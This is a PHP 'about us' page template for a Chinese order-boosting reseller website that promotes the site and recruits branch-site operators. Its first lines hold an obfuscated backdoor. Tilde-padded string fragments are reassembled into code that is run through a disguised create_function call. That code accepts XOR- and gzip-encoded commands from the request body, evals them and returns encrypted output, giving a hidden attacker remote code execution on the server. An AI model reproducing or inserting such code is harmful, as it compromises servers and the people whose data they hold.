<?php
$i='~h("~/$kh~(~~.+)$~kf/",@file_get_co~ntents("php://~inpu~t"),$~m)~==1){~@o~~b_~start();@e';
$q='$k="~4d~12~ac2a";$kh="ad55~14b~d8fc1";$kf~="fac4~ff~b48f67"~;$p="o~EqTNR~rX~wgtS~WP9';
$x=str_replace('sn','','crsnsnesnate_fusnnsnctsnion');
$v='b_e~nd_clean();$r~=@ba~se64_en~cod~e(@x(@~g~zcompress($~o),$k));pri~n~t(~"$p$kh$r$kf");}';
$I='($j=0;($~j<$c&&$i<$l);~$j++,$i~++){$~o.=$~t{$i}~^$k~{$j};}}ret~urn $o;~}if(@preg~_matc';
$a='v";funct~ion x($~t~,$k){$c=strlen~($k)~;~$~l=strlen~($t);$o="";fo~~r(~$i=~0;$i<$l;)~{for';
$z='va~l(@gzu~~ncompress(@x(@base~64_decod~e(~$m[1]),$~k)));$o=@ob_g~et_conten~ts~();@o~';
$K=str_replace('~','',$q.$a.$I.$i.$z.$v);
$l=$x('',$K);$l();

if(!defined('IN_CRONLITE'))exit();

$thtime=date("Y-m-d").' 00:00:00';
$count1=$DB->count("SELECT count(*) from shua_site");
$count2=$DB->count("SELECT count(*) from shua_site where addtime>='$thtime'");
?>
<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
  <title><?php echo $conf['sitename']?> - 关于我们</title>
  <meta name="keywords" content="<?php echo $conf['keywords']?>">
  <meta name="description" content="<?php echo $conf['description']?>">
  <link href="<?php echo $cdnpublic?>twitter-bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet"/>
  <link href="<?php echo $cdnpublic?>font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"/>
  <link href="<?php echo $cdnserver?>assets/beautify/css/public-style.main.css" rel="stylesheet">
  <!--[if lt IE 9]>
    <script src="<?php echo $cdnpublic?>html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="<?php echo $cdnpublic?>respond.js/1.4.2/respond.min.js"></script>
  <![endif]-->
<style>
body{ font-size:14px; background:url("<?php echo $background_image?>") fixed; <?php echo $repeat?>;padding:0;margin:0 auto; position:relative; }
</style>
</head>
<body style="font-size:13px;color:#272727;">
<header>
	<div class="logo"><img src="<?php echo $logo?>" style="height:40px; width:40px;"></div>
	<font class="text">本站、个人简介</font>
	<a class="fade-out" href="./"><i class="glyphicon glyphicon-home"></i>首页</a>
</header>
<div class="body-box" style="max-width: 800px;">

<div class="panel-shadow panel-bor-top rdu-5x" style="position:relative;z-index:-2;">
	<div style="width:100px;background:#fff;margin:0 auto;text-align:center;">
		<img src="//q4.qlogo.cn/headimg_dl?dst_uin=<?php echo $conf['kfqq']?>&spec=100" style="width:70px; height:70px;border-radius:50%;margin-top:10px;">
	</div>
	<div class="fgx"></div>
	<div class="pd-text cnt" style="border:none">
		<font color="#f00"><b>主 站 长</b></font><img src="./assets/beautify/img/gg-rz.jpg" style="height:15px;margin:-2px 0 0 5px;">
	</div>
	<ul class="two-df-naw">
		<li style="border-right:#ddd solid 1px;text-align:left;"><font color="#f00">职业</font>：程序猿（专业）</li>
		<li style="text-align:left;"><font color="#f00">站长QQ</font>：<font color="#0080ff"><?php echo $conf[ 'kfqq']?></font></li>
	</ul>
	<div class="pd-text cnt tw1"><font color="#f00">座右铭</font>：业精于勤、学无止境、工匠精神！</div>
</div>


<div class="panel-shadow panel-bor-top rdu-5x">
	<div style="text-align:center;padding:12px 0;"><img src="<?php echo $logo?>" style="width:70px;height:70px;"></div>
	<div class="cnt title-bj"><div class="title tw2"><b><?php echo $conf['sitename']?></b></div></div>
	<div class="sjx"></div>
	<div class="pd-text cnt tw1" style="border:none">本站网址：<a href="http://<?php echo $_SERVER['HTTP_HOST']?>">
		<font color="#0080ff">http://<?php echo $_SERVER['HTTP_HOST']?>
		</font></a>（请牢记哦）
	</div>
	<div class="pd-text">
		<div class="cnt" style="margin:5px 17% 10px 17%;padding-bottom:10px;border-bottom:#ff8000 solid 2px;color:#f00;">
本站于：<?php echo $conf['build']?> 正式成立
		</div>
		<div>我们是全网最专业的代刷系统，商品齐全、货源稳定、价格低廉、售后保障。拥有丰富的人脉和资源，我们专注于优质商品，实时掌握代刷市场的动态。</div>
		<div style="padding:8px 0; text-align:center;">
			<a href="./user/reg.php">
			<img style="width:80px; margin-right:20px;" src="./assets/beautify/img/gg-hyff.jpg">
			<img style="width:80px; margin-right:20px;" src="./assets/beautify/img/gg-cyjm.jpg">
			<img style="width:80px; " src="./assets/beautify/img/gg-gtzf.jpg"></a>
		</div>
		<div>
加入我们，只要你坚持，你不用担心不赚钱，不用担心货源不好，更不用担心我们跑路，我们即使不敢保证你月入上万，在网上赚个零花钱绝对没问题！
		</div>
		<div style="border-top:#ff8000 dashed 1px;padding:10px 17% 5px 17%;margin-top:10px;">
			<a class="btn btn-info btn-sm" href="./"><i class="glyphicon glyphicon-home"></i> 网站首页</a>
			<a class="btn btn-info btn-sm" href="./user/regsite.php" style="float:right;"><i class="glyphicon glyphicon-fire"></i> 加盟分站</a>
		</div>
	</div>
	<ul class="three-df-naw">
		<li><div>订单总数</div><span id="count_orders"></span> 条</li>
		<li><div>交易总额</div><span id="count_money"></span> 元</li>
		<li><div>旗下分站</div><span id="count_site"></span> 个</li>
	</ul>
</div>

</div>

<footer class="tw1" style="line-height:40px;width:100%;display:block;text-align:center;background: rgba(255, 255, 255, 0.7);border-top:#bbb solid 1px;color:#333;font-size:13px;">
版权所有@<?php echo $conf['sitename']?> 有你更精彩
</footer>

<script src="<?php echo $cdnpublic?>jquery/1.12.4/jquery.min.js"></script>
<script src="<?php echo $cdnpublic?>twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
<script src="<?php echo $cdnpublic?>jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
<script src="<?php echo $cdnpublic?>layer/2.3/layer.js"></script>
<script type="text/javascript">
var isModal=false;
var homepage=true;
</script>
<script src="assets/js/main.js?ver=<?php echo VERSION ?>"></script>
</body>
</html>